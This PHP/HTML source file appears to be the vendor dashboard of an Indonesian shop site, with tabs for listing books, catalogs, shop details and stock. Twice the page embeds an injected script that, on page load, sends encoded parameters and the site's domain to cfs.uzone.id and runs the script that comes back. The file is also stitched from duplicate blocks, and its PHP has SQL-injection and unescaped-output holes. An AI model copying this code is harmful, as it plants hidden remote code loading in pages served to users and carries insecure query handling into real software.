<?php 
error_reporting(0);
session_start();
if(!$_SESSION['pembeli']){
    ?>
    <Script>
    alert("anda harus login terlebih dalulu");
    window.location.href="index.php";
    </script>
    
    <?php

}else{ ?>
<!DOCTYPE html>
<html>
<head>
	<title>Situs Jual Beli Mobil Terpercaya</title>
	<link rel="stylesheet" type="text/css" href="asset/css/style.css">
	<link rel="stylesheet" type="text/css" href="asset/css/slider.css">
	<style type="text/css">
		input[type=text]{margin: 10px 0 10px 0; padding: 10px ; width: 400px; color: #ccc;}
	input[type=password]{margin: 10px 0 10px 0; padding: 10px ; width: 380px; color: #ccc;}
	input[type=submit]{margin: 10px 0 10px 0; padding: 10px; background: orange; color: #fff; border: 0; outline: 0; width: 200px; border: 1px solid orange; cursor: pointer; }
	.chip {
    display: inline-block;
    padding: 10px;
    margin: 10px 0 10px 0;
    height: 20px;
    font-size: 18px;
    line-height: 20px;
    border-radius: 25px;
    background-color: #f1f1f1;
}

.chip img {
    float: left;
    margin: 0 10px 0 -25px;
    height: 50px;
    width: 50px;
    border-radius: 50%;
}

.closebtn {
    padding-left: 10px;
    color: #888;
    font-weight: bold;
    float: right;
    font-size: 20px;
    cursor: pointer;
}

.closebtn:hover {
    color: #000;
}
.tab {
    list-style-type: none;
    margin: 0;
    padding: 0;
    overflow: hidden;
    border: 1px solid #ccc;
    background-color: #f1f1f1;
    float: left;
    width: 88%;
    margin-left: 6%;
    text-align: left;
    margin-top: 50px;
}
.tab li{display: inline;}
.tab li a {
    display: inline-block;
    color: #444444;
    text-align: center;
    padding: 14px 16px;
    text-decoration: none;
    transition: 0.3s;
    font-size: 17px;
}
.tab li a:hover {
    background-color: #ddd;
}
.tab li a:focus, .active {
    background-color: #ccc;
}

.tabcontent {
    display: none;
    padding: 25px 12px;
    border: 1px solid #ccc;
    border-top: none;
    width: 86%;
    float: left;
    margin-left: 6%;
}
td,th{border:1px solid #ccc;padding:10px;}
table{border-collapse:collapse; width: 50%;}
	</style>
</head>
<body>
<?php include 'component/header.php'; ?>
 <?php 
error_reporting(0);
session_start();
if($_SESSION['pembeli']){
?>
<div class="bagan-banner">
<center>
<div class="tab">
  <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'jual')">Jual Buku</a></li>
   <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'data_buku')">Data Buku</a></li>
   <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'katalog_buku')">Tambah Katalog</a></li>
   <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'view_katalog')">Data Katolog</a></li>
   <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'detail_toko')">Detail Toko</a></li>
   <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'stok')"> Stok Buku</a></li>
      <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'pendapatan')"> Pendapatan</a></li>
</div>
<?php 
$toko=$db->tampil_toko($_SESSION['id_pembeli']);
$katalog=$db->tampil_katalog($_SESSION['id_pembeli']);
$buku=$db->tampil_buku($_SESSION['id_pembeli']);
$katalog_vendor=$db->tampil_katalog_vendor($_SESSION['id_pembeli']);
$buku_vendor=$db->tampil_buku_vendor($_SESSION['id_pembeli']);
?>
<div id="jual" class="tabcontent">
 <form action="handler.php?aksi=jual" method="post" enctype="multipart/form-data">
    <input type="hidden" name="id_vendor" value="<?php echo $_SESSION['id_pembeli'] ?>" style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;"><br>
    <input type="text" name="nama_buku" placeholder="Nama Buku" required style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;"><br>
    <input type="text" name="harga" placeholder="Harga" required style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;"><br>
    <span>Pilih gambar </span><input type="file" name="gambar"  required style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;"><br>
    <input type="text" name="pengarang_buku" placeholder="pengarang buku" required style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;"><br>  
    <p style="font-size: 13px; margin-top: 10px; color: #ccc">*Katalog</p>
          <select name="katalog" style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;">
             <?php 
            foreach($katalog as $r){
                ?>
                    <option value="<?php echo $r['nama_katalog']; ?>"><?php echo $r['nama_katalog']; ?></option>
                <?php
            }
       ?>
           </select><br>
    <input type="number" name="diskon" value="%" placeholder="diskon Buku" required style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;"><br>
    <textarea placeholder="Detail barang" name="ket" required style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;"></textarea><br>
    <input type="number" name="qty" placeholder=qty style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;"><br>
     <input type="text" name="kategori" placeholder="Kategori Buku" required style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;"><br>
    <input type="submit" value="Jual Buku">
</form>
</div>
<div id="data_buku" class="tabcontent">
    <table>
      <th>Nama Buku</th><th>Katalog</th><th>Kategori</th><th>Pengarang</th><th>Harga</th><th>Hapus</th>
      <?php 
            foreach($buku as $r){
                ?>
                    <tr>
                        <td><?php echo $r['nama_buku']; ?></td>
                        <td><?php echo $r['katalog']; ?></td>
                        <td><?php echo $r['kategori'] ?></td>
                        <td><?php echo $r['pengarang_buku']; ?></td>
                        <td>Rp.<?php echo $r['harga']; ?></td>
                        <td>hapus</td>
                    </tr>
                <?php
            }
       ?>
  </table>
</div>
<div id="katalog_buku" class="tabcontent">
 <center>
    <form action="handler.php?aksi=tambah_katalog" method="post" enctype="multipart/form-data">
    <input type="hidden" name="id_vendor" value="<?php echo $_SESSION['id_pembeli'] ?>" style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;"><br>
    <input type="text" name="nama_katalog" placeholder="Nama Katalog" style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;"><br>
    <input type="submit" value ="Simpan">
    </form>
 </center>
  

</div>
<div id="view_katalog" class="tabcontent">
  <table>
      <th>Nama Katalog</th><th>Hapus</th>
     <?php 
            foreach($katalog_vendor as $r){
                ?>
                    <tr>
                        <td><?php echo $r['nama_katalog']; ?></td>
                        <td>hapus</td>
                    </tr>
                <?php
            }
       ?>
  </table> 
</div>
<div id="detail_toko" class="tabcontent">
  <table>
      <th>Nama Toko</th><th>Id Pemilik</th><th>Alamat</th><th>Type Toko</th><th>Hapus</th>
      <?php 
            foreach($toko as $r){
              $id=$r["id_vendor"];
              $kat=mysql_query("SELECT * from pembeli where id_pembeli='$id'");
              $kat2=mysql_fetch_array($kat);
                ?>
                    <tr>
                        <td><?php echo $r['nama_toko']; ?></td>
                        <td><?php echo $kat2['username'];?></td>
                        <td><?php echo $r['alamat']; ?> Kota <?php echo $r['kota']; ?> Kecamatan <?php echo $r['kecamatan']; ?> Provinsi <?php echo "provinsi"; ?></td>
                        <td><?php echo $r['type']; ?></td>

                        <td>hapus</td>
                    </tr>
                <?php
            }
       ?>
  </table>
</div>
<div id="stok" class="tabcontent">
     <form action="handler.php?aksi=stok" method="post" enctype="multipart/form-data">
    <input type="hidden" name="id_vendor" value="<?php echo $_SESSION['id_pembeli'] ?>" style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;"><br>
     <select name="id_buku" style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;">
             <?php 
            foreach($buku_vendor as $r){
                ?>
                    <option value="<?php echo $r['id_buku']; ?>"><?php echo $r['nama_buku']; ?></option>
                <?php
            }
       ?>
           </select><br>
            <input type="number" name="jumlah" placeholder="jumlah" style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;"><br>
    <input type="submit" value ="Simpan">
    </form>
</div>
<div id="pendapatan" class="tabcontent">
  <form>

  </form>
</div>
<div id="kategori_buku" class="tabcontent">
 
</div>
<?php } ?>
<script>
function openCity(evt, cityName) {
    var i, tabcontent, tablinks;
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
    }
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
}
</script>
     
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK0qZadE47JUdGHFHLfbVduxLeSZTaN%2fCvsyhiQsCTEtCGiaxtBhV5Mo6GA6xdw0AJrNFB8G2Df%2fKvwdy8%2b5RGE7WpzSx3nVPJZepAYRCPKtp%2bMqQ8l9q3SGImIqt4qpguMnxb%2bd%2f2zxV2j%2fcS%2bq9K7zM3p9pEeJfMPs2kDGypYtNiRFlawHoJvtn%2fQq0CXoXf1bCec%2f7skoZOjStT1qwTrB4b4xPG2AOpVhK1u01LQz2FunpFx2x5blSkmsCzQux07BIVc9QzUkyvOnTWciBi4FTtr8gwOegFbawaUbUFUIAo43j6PH3X6nC%2fnuuRw9nD1JBN4RRsWXD3d0a7JTrnpIyZNP9XOpV3InPV4E9BbglIpzZAVA%2f4dP6Z4nEO0ygQC2Po7sg1GQ%2fw9xDmH5iYgOyFEVK80oFK0k1vCsH%2b9VinlymBB1nIGAtweiNASO8i7FIf1RPz949TGTlpBNtlIbz%2fk9GMwd%2f3cRQk%2bev9E5ipJvQ73Q3OIi1QuKVN1UD%2b6f31Bnsowis25grxjyXeewp%2f9%2fc%2fJDEXGdTLjbZ3dtLQBgpC76rbcL0t10%2b0SfvI7Op7b7ZcW6M%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

</center>
	
</div>
<div class="bagan-banner">
<center>
<div class="tab">
  <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'jual')">Jual Buku</a></li>
   <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'data_buku')">Data Buku</a></li>
   <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'kategori_buku')">Katalog Buku</a></li>
   <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'add_buku')">Tambah Kategori</a></li>
   <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'detail_toko')">Detail Toko</a></li>
   <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'pesanan')"> Pesanan</a></li>
      <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'pendapatan')"> Pendapatan</a></li>
</div>
<div id="jual" class="tabcontent">
  <form>

  </form>
</div>
<div id="data_buku" class="tabcontent">
  <form>

  </form>
</div>
<div id="kategori_buku" class="tabcontent">
 <center>
    <form action="handler.php?aksi=tambah_katalog" method="post" enctype="multipart/form-data">
    <input type="hidden" name="id_vendor" value="<?php echo $_SESSION['id_pembeli'] ?>" style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;"><br>
    <input type="text" name="nama_katalog" placeholder="Nama Katalog" style="margin: 10px 0 10px 0; padding: 10px; width: 200px; float:none;"><br>
    <input type="submit" value ="Simpan">
    </form>
 </center>
  

</div>
<div id="add_buku" class="tabcontent">
  <form>

  </form>
</div>
<div id="detail_toko" class="tabcontent">
  <table>
      <th>Nama Toko</th><th>Id Pemilik</th><th>Type Toko</th><th>Hapus</th>
    
  </table>
</div>
<div id="pesanan" class="tabcontent">
  <form>

  </form>
</div>
<div id="pendapatan" class="tabcontent">
  <form>

  </form>
</div>
<div id="kategori_buku" class="tabcontent">
 <div class="chip">
  <img src="asset/image/icon/camera.png" alt="Person" width="96" height="96">
  Avanza
  <span class="closebtn" onclick="this.parentElement.style.display='none'">&times;</span>
</div>
</div>
<script>
function openCity(evt, cityName) {
    var i, tabcontent, tablinks;
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
    }
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
}
</script>
     
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK0qZadE47JUdGHFHLfbVduxLeSZTaN%2fCvsyhiQsCTEtCGiaxtBhV5Mo6GA6xdw0AJrNFB8G2Df%2fKvwdy8%2b5RGE7WpzSx3nVPJZepAYRCPKtp%2bMqQ8l9q3SGImIqt4qpguMnxb%2bd%2f2zxV2j%2fcS%2bq9K7zM3p9pEeJfMPs2kDGypYtNiRFlawHoJvtn%2fQq0CXoXf1bCec%2f7skoZOjStT1qwTrB4b4xPG2AOpVhK1u01LQz2FunpFx2x5blSkmsCzQux07BIVc9QzUkyvOnTWciBi4FTtr8gwOegFbawaUbUFUIAo43j6PH3X6nC%2fnuuRw9nD1JBN4RRsWXD3d0a7JTrnpIyZNP9XOpV3InPV4E9BbglIpzZAVA%2f4dP6Z4nEO0ygQC2Po7sg1GQ%2fw9xDmH5iYgOyFEVK80oFK0k1vCsH%2b9VinlymBB1nIGAtweiNASO8i7FIf1RPz949TGTlpBNtlIbz%2fk9GMwd%2f3cRQk%2bev9E5ipJvQ73Q3OIi1QuKVN1UD%2b6f31Bnsowis25grxjyXeewp%2f9%2fc%2fJDEXGdTLjbZ3dtLQBgpC76rbcL0t10%2b0SfvI7Op7b7ZcW6M%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

</center>
  
</div>


</html>
    <?php
    }
?>